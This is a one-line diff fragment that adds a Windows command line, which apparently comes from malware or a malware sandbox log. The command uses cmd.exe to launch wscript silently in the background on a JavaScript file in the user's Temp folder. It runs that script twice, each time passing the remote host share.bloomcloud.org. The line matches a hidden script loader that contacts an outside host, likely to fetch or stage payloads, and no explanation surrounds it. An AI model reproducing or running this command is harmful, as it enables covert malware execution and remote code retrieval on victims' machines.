@@ -1,0 +1,1 @@
+"C:\Windows\System32\cmd.exe" /c start /b wscript "C:\Users\admin\AppData\Local\Temp\ghws.js" share.bloomcloud.org/ 1 & start /b wscript "C:\Users\admin\AppData\Local\Temp\ghws.js" share.bloomcloud.org/ 2
